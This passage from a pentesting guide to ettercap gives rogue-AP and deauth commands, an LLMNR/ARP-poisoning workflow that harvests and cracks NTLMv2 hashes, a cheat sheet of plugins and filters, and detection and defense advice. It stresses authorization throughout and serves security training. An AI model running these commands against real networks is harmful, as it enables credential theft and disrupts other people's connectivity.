sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT

# 6. Start rogue AP + DHCP
sudo hostapd rogue.conf &
sudo dnsmasq -C dnsmasq.conf -d &

# 7. Deauth clients from real AP to push them to rogue
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan1mon   # continuous until Ctrl+C

# 8. Clients reconnect if they auto-pick the rogue AP (stronger signal, same SSID),
#    they now DHCP into your network. Run ettercap against wlan0.
sudo ettercap -T -q -i wlan0 -M arp:remote -P dns_spoof //10.99.0.1//
```

Notes: WPA2-PSK evil twin only works if the rogue AP has the same passphrase as the target, otherwise clients fail the 4-way handshake and don't connect. Open networks and enterprise networks (EAP) have different attack patterns `hostapd-wpe` specifically supports capturing EAP credentials from enterprise networks.

### Workflow: Internal Pentest Credential Harvest via LLMNR + ARP

**Goal:** on an authorized internal engagement, harvest NTLMv2 hashes from Windows hosts via LLMNR/NBT-NS poisoning amplified by ARP-level traffic redirection.

```bash
# 1. Passive baseline first see what's on the wire normally
sudo responder -I eth0 -A                  # analyze mode, 10 minutes, then Ctrl+C

# 2. Identify high-value hosts (DCs, file servers, admin workstations)
sudo nmap -sn 10.0.0.0/24
sudo nmap -p 445 --script smb-os-discovery 10.0.0.0/24

# 3. Start responder (active)
sudo responder -I eth0 -wF
# -w: WPAD server on
# -F: force WPAD auth even for clients that don't ask

# 4. In parallel: ettercap ARP poisoning to redirect more traffic through us
sudo ettercap -T -q -i eth0 -M arp:remote /10.0.0.0/24// /10.0.0.1//

# 5. Hashes accumulate in /usr/share/responder/logs/
# Crack with hashcat mode 5600 (NetNTLMv2)
hashcat -m 5600 /usr/share/responder/logs/Responder-Session.log wordlist.txt

# 6. Clean exit from ettercap (ARP healing)
# Clean exit from responder (Ctrl+C)
```

This workflow amplifies Responder's catch by ensuring more of the LAN's traffic flows through you. The ARP poisoning itself is very noisy expect detection on any network with EDR/NDR tooling.

---

## Cheat Sheet

### Invocation Flags

| Flag | Purpose |
|---|---|
| `-T` | Text/curses UI |
| `-G` | GTK GUI |
| `-D` | Daemon mode (no UI) |
| `-C` | Curses UI (alias on some builds) |
| `-i <iface>` | Interface to use |
| `-I` | List interfaces |
| `-q` | Quiet mode (don't print packet contents) |
| `-M <method>[:args]` | MITM method (arp, icmp, dhcp, port, ndp) |
| `-B <iface>` | Bridged sniffing (second interface) |
| `-P <plugin>` | Load plugin |
| `-F <file>` | Load compiled filter (.ef) |
| `-w <file>` | Write captured packets to pcap |
| `-r <file>` | Read packets from pcap (offline analysis) |
| `-l <file>` | Text log file |
| `-L <file>` | Binary log file |
| `-m <file>` | Log only info messages |
| `-j <file>` | Load hosts list from file |
| `-k <file>` | Save hosts list to file |
| `-e <regex>` | Only capture packets matching regex |
| `-R` | Reverse target selection |
| `-t <proto>` | Protocol: `tcp`, `udp`, `all` |
| `-p` | Passive (no MITM, sniff only) |
| `-u` | Don't forward packets (black hole careful) |
| `-z` | Don't perform initial ARP scan |
| `-s <cmd>` | Execute command on startup |
| `-f <file>` | PCAP filter (like tcpdump filter expression) |
| `--iflist` | List interfaces |
| `--plugin-list` / `-P list` | List plugins |

### MITM Method Strings

| Method | Syntax | Notes |
|---|---|---|
| ARP poisoning | `-M arp[:options]` | Options: `remote`, `oneway` |
| ICMP redirect | `-M icmp:MAC/IP` | Real gateway MAC and IP |
| DHCP spoofing | `-M dhcp:pool/netmask/dns` | IP pool, subnet, DNS |
| Port stealing | `-M port[:options]` | Options: `remote`, `tree` |
| NDP (IPv6) | `-M ndp[:options]` | IPv6 neighbor discovery spoofing |

### Target Syntax

```
MAC/IPs/PORTs
```

Empty field = "any".

| Example | Meaning |
|---|---|
| `//` | All hosts, all ports |
| `/10.0.0.5//` | Host 10.0.0.5, any port |
| `/10.0.0.5/80` | Host 10.0.0.5, port 80 |
| `/10.0.0.0/24//` | CIDR, any port |
| `/10.0.0.1-10//` | Range |
| `AA:BB:CC:DD:EE:FF///` | Specific MAC, any IP, any port |
| `///80,443` | Any host, ports 80 and 443 |

### Common etterfilter Functions

| Function | Purpose |
|---|---|
| `search(where, what)` | Match substring |
| `regex(where, pattern)` | Match regex |
| `replace(what, with)` | Substring replace (length-preserving) |
| `inject(filename)` | Inject file contents |
| `drop()` | Drop packet |
| `kill()` | Kill connection |
| `log(where, file)` | Log field to file |
| `msg(str)` | Console message |
| `exec(cmd)` | Execute shell command |
| `exit()` | Stop filter for this packet |

### Filter Field References

| Field | Meaning |
|---|---|
| `ip.proto` | TCP, UDP, ICMP |
| `ip.src`, `ip.dst` | Source/dest IP |
| `ip.ttl` | IP TTL |
| `tcp.src`, `tcp.dst` | TCP ports |
| `tcp.flags` | TCP flags (SYN, ACK, etc.) |
| `udp.src`, `udp.dst` | UDP ports |
| `eth.src`, `eth.dst` | MAC addresses |
| `DATA.data` | Packet payload |
| `DATA.length` | Payload length |

### Key Plugins

```bash
# DNS spoofing (most common plugin)
ettercap -T -M arp:remote -P dns_spoof //

# mDNS spoof
ettercap -T -M arp:remote -P mdns_spoof //

# NBNS spoof
ettercap -T -M arp:remote -P nbns_spoof //

# Check if poison is working
ettercap -T -M arp:remote -P chk_poison /10.0.0.5//

# Repoison after ARP heal
ettercap -T -M arp:remote -P repoison_arp //

# Auto-add new hosts
ettercap -T -M arp:remote -P autoadd //

# List all plugins
ettercap -P list
```

### Keyboard Shortcuts (Curses Mode)

| Key | Action |
|---|---|
| `h` | Help |
| `q` | Quit (with ARP healing) |
| `s` | Stats |
| `l` | Hosts list |
| `c` | Sort connections |
| `v` | Visualization |
| `p` | Plugin menu |
| `f` | Start/stop filter |
| `o` | Profile menu |
| `space` | Pause/resume sniffing |

### Sanity Checks Before Starting

```bash
# 1. Correct interface?
ip -c link show
# 2. On the right subnet?
ip -c addr show
# 3. Can reach the gateway?
ping -c 3 $(ip route | awk '/default/ {print $3}')
# 4. IP forwarding enabled?
sysctl net.ipv4.ip_forward
# 5. No conflicting firewall rules?
sudo iptables -L -n -v
# 6. Ettercap permissions OK?
sudo -v
```

---

## Detection & Defense

Ettercap-based attacks are loud by modern standards and defenders catch them regularly when they're watching. Things that detect these attacks:

**Network-level:**
- **Dynamic ARP Inspection (DAI)** on managed switches drops gratuitous ARP from unauthorized hosts. Enabled on most enterprise networks. Defeats classic ARP poisoning entirely.
- **DHCP snooping** on switches defeats DHCP spoofing by trusting only authorized DHCP server ports.
- **Port security** drops frames from unexpected MACs, defeating port stealing.
- **802.1X** requires authentication before allowing LAN access at all.
- **NIDS (Zeek, Suricata, Snort)** with rulesets for ARP anomalies duplicate MACs, MAC/IP mapping changes, unexpected gratuitous ARP detect poisoning within seconds of it starting.
- **ARP monitoring daemons** (`arpwatch`, `arpalert`) log and alert on every ARP table change.

**Host-level:**
- **EDR with network monitoring** (CrowdStrike, SentinelOne, Defender for Endpoint) can detect the anomalous ARP patterns on the endpoint side and flag MITM.
- **Windows ARP cache entries** can be viewed with `arp -a` if the gateway MAC changes, that's a sign.
- **Static ARP entries** for the gateway on critical hosts eliminate poisoning risk for those hosts.
- **Certificate warnings** when SSL MITM is attempted, browsers throw warnings that attentive users (fewer than you'd hope) will notice.

**Defensive posture summary for networks you control:**

1. Enable DAI, DHCP snooping, and port security on all managed switches
2. Deploy 802.1X or equivalent NAC
3. Use HSTS preloading on all web properties
4. Mandate DNS over HTTPS/TLS on endpoint OSes
5. Monitor for ARP anomalies (Zeek `arp.log` is a good source)
6. Segment critical hosts so a compromised LAN segment doesn't expose them
7. Disable LLMNR and NBT-NS on Windows endpoints (GPO)
8. Enforce SMB signing
9. Use mutual TLS / cert pinning for critical app traffic

If you're doing red team work, assume any competent SOC will detect classic MITM within minutes. Use it for labs, training, CTFs, and specific targeted attacks where the risk is calculated not as a general reconnaissance technique on defended networks.

---

## Practical Notes

**Ettercap is showing its age.** Development is sporadic, the codebase is old, and bugs in GTK mode are common on modern distros. If you're evaluating whether to invest time in ettercap or its modern replacement, **pick bettercap**. Bettercap has active development, modern TLS handling, a clean scripting interface, WiFi/BLE/HID modules ettercap lacks, and handles contemporary networks better. Ettercap remains relevant for specific use cases (the filter language is genuinely useful, the plugin ecosystem has a few unique entries, and the curses UI is preferred by some), but for most workflows bettercap is the better starting point.

**Clean exit matters more than people realize.** Killing ettercap with `kill -9` or a crashed process leaves every victim on the LAN with poisoned ARP entries pointing to a non-forwarding host. The LAN effectively breaks until ARP caches time out 60 seconds on Linux, up to 10 minutes on Windows. On a production network, this is a resume-generating event. Always exit with `q` to trigger ARP healing, and if you're scripting, trap SIGTERM/SIGINT and invoke a clean shutdown. For paranoia, manually send gratuitous ARP from the real gateway's MAC after exit using `arping`:

```bash
sudo arping -c 5 -U -I eth0 -s <real-gw-mac> <gateway-ip>
```

**DAI is everywhere on enterprise networks, and ettercap ARP poisoning just doesn't work against it.** If you're doing an authorized pentest and ARP poisoning fails silently, check for DAI before trying to debug ettercap. Symptoms: ettercap reports poison is active, `chk_poison` plugin confirms, but the victim's ARP table still shows the real gateway. DAI is doing its job. Alternatives include ICMP redirects (usually dead), DHCP spoofing (works if snooping isn't enabled), physical inline placement (bridged mode with a tap), or attacking something other than L2.

**Modern Wi-Fi makes sniffing harder than it used to be.** WPA3 is rolling out and defeats offline cracking entirely (SAE handshakes don't expose an offline-crackable hash). WPA2-Enterprise with proper certificate validation defeats evil twin unless you also have CA compromise. Even WPA2-PSK on modern APs often uses management frame protection (802.11w) which blocks deauth frames. The classic wireless attack chain still works against home and SMB networks that haven't updated, and against misconfigured enterprise deployments, but the defaults have moved.

**Packet rewriting is harder than it looks.** Etterfilter's `replace()` requires length-preserving substitution because modifying packet length breaks TCP sequence numbers and causes retransmissions/connection resets. The historical trick is to pad with ignored HTML attributes (`ignored=""`) or to inject HTML that's the same length as what you replace. For real traffic modification on TLS, you need a termination proxy (mitmproxy, Burp), not ettercap filters ettercap can't modify encrypted bytes meaningfully.

**DNS spoofing only works against classic DNS.** Every device on the network that uses DoH or DoT bypasses ettercap's dns_spoof entirely. In 2026 this includes: Firefox (DoH by default on US installs for a while now), Chrome (DoH when the system resolver supports it), iOS and macOS (configured via profile or system-wide), Windows 11 (DoH support built-in and increasingly used), many Android devices. What still falls for DNS spoofing: IoT devices, older mobile OSes, devices using DHCP-provided DNS, enterprise endpoints without explicit DoH configuration, and anything using legacy DNS libraries. If DNS spoofing fails silently on a target, it's probably using encrypted DNS check with `tcpdump -i eth0 'port 53'` to see if there are even any classic DNS queries in the traffic.

**Credential sniffing is mostly about legacy and internal services now.** The days of catching people's Facebook passwords on airport Wi-Fi are gone (Facebook is HTTPS everywhere, as is every major service). Where credential sniffing still pays off: internal business applications on HTTP, legacy network gear admin interfaces, SCADA/ICS protocols, printer admin, telnet/FTP on internal networks, SNMP community strings, database auth in legacy configurations. Internal network assessments still find these regularly. External/public Wi-Fi attacks find nothing interesting anymore.

**The "put it in monitor mode and capture everything" fantasy doesn't apply to wired networks.** Ettercap on a switched Ethernet network without active MITM sees only broadcast traffic and traffic destined for the attacker's MAC. The "promiscuous mode captures everything" idea comes from the hub era. On switches, you either need span/mirror ports (lab setup), a network tap (inline hardware), or active MITM (ARP poisoning). This is a source of confusion for people coming from reading older tutorials.

**Scope and noise discipline matter.** Ettercap has the option to poison the entire LAN with `//` / `//` targets, and it's tempting to do so to maximize capture. This is almost always wrong. It breaks connectivity for hosts you don't care about, triggers detection faster than targeted poisoning, and produces garbage data. Pick specific targets, minimize the attack window, and clean up afterward. On real engagements, noise discipline is a professionalism marker and reduces blast radius if something goes wrong.

**Test your setup in a lab before running it against anything real.** Build a small lab with a victim VM, a gateway VM, and an attacker VM on an isolated network. Run every step of your intended workflow there first. The number of things that can go wrong during MITM (forwarding not enabled, wrong interface, wrong target, filter compile errors, plugin conflicts, iptables rules conflicting with redirect) is high, and figuring out problems while the clock is running on an engagement is painful. Lab first, then production.

**Keep packet captures.** `-w capture.pcap` for every session, always. Even if nothing looks interesting live, saving the pcap means you can analyze it later in Wireshark or Zeek with fresh eyes. Half the value of MITM engagements shows up during post-analysis, not during the live capture.

**Read the etter.conf file at least once.** There are tuning parameters that materially affect behavior `arp_storm_delay`, `arp_poison_delay`, `connection_timeout` and defaults aren't always right for every scenario. The file is well-commented.

**Ettercap logs aren't great for reporting.** The `.eci`/`.ecp` log formats are specific to ettercap and awkward to analyze. For anything you need to report on, tee output to text files or use `-w` to get pcap that can be analyzed with real tools. Don't rely on ettercap's own log formats as your only artifact from a session.

**Finally, once more:** **only run this against networks and devices you own or have explicit written authorization to test.** The legal disclaimer at the top of this document is not a formality. The techniques described here are effective enough to cause real harm and obvious enough to be caught. "Testing" in scare quotes on a network you don't own is a criminal offense in most of the world, and professional reputations don't survive that kind of mistake.